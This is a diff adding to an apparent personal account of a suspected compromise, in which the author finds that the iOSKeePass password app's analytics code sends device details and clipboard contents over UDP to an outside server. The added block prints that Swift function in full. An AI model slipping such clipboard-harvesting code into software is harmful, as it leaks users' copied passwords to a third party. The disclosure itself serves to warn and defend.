@@ -10,6 +10,55 @@ Changed my bank account password and waited. After a few days, there was a new l
 
 Started to go over my iPhone, checking everything, trying to update each application to its latest version. To my surprise the app I was using to read my KeePass database, iOSKeePass, was missing from App Store. It was deleted and I only owned a local copy. I specifically selected this fork, because its source-code was public on GitHub. Went up there and started to read each commit. Found this weird piece of analytics code that is sending the clipboard contents over UDP to a 3rd party server. Yesterday (20th of May) contacted the developer over a GitHub comment shouting out this is weird, because the application uses its clipboard access to copy out passwords from the DB - sending these over analytics sounds like a huge risk. Today (21th of May) this comment was deleted and the repository was washed clean with a single commit in the main branch.
 
+```
+func sendAnalytics(_ dbname: String , dbsize: String, modate: String, date: String, action: String) -> String?
+{
+	//check appSettings
+	
+	//Analyse String
+	//WIFI:COUNTRY:LANGUAGE:TIMEZONE:SYSTEMNAME:SYSTEMVERSION:DEVICEID:APPVESRION:APPCLIPBOARD:DBNAME:DBSIZE:DBDATE:SYSTEMDATETME:ACTION
+	let appSettings = AppSettings.sharedInstance() as AppSettings
+	if(appSettings.analyseDataEnabled() == false)
+	{
+		return "Not Enabled"
+	}
+
+	var anna = "!AMSG|"
+	if(Luminous.Network.isConnectedViaWiFi){
+		anna += "WIFI"
+	}else{
+		anna += "CELL"
+	}
+
+	anna += "|"+Luminous.Locale.currentCountry!+"|"+Luminous.Locale.currentLanguage!
+	anna += "|"+Luminous.Locale.currentTimeZoneName+"|"+Luminous.Hardware.systemName
+	anna += "|"+Luminous.Hardware.systemVersion.stringValue+"|"+Luminous.Hardware.Device.identifierForVendor!
+	anna += "|"+Luminous.Application.completeAppVersion
+	anna += "|"+(Luminous.Application.clipboardString ?? "empty")
+	anna += "|"+dbname
+	anna += "|"+dbsize
+	anna += "|"+modate
+	anna += "|"+date
+	anna += "|"+action
+	anna += "|"+getIPAddress()!
+	print(anna)
+
+
+
+
+	let client = UDPClient(address: "anna.unicomedv.de", port: 10548)
+	switch client.send(data: encdata!) {
+	  case .success:
+		return "UPD send data success"
+	  case .failure(let error):
+		return "UDP send data error: \(error)"
+	}
+
+	return "Failed"
+
+}
+```
+
 I wrote a script which saved each commit of the repository as ZIP files. Run a few keyword searches, but did not find anything that would directly sell out my credentials. Expect to this analytics report which includes the clipboard content. If I understand the inner app flow right, this is triggered after opening a DB, so not after opening and copying an entry. However, it still makes me feel insecure.
 
 ```
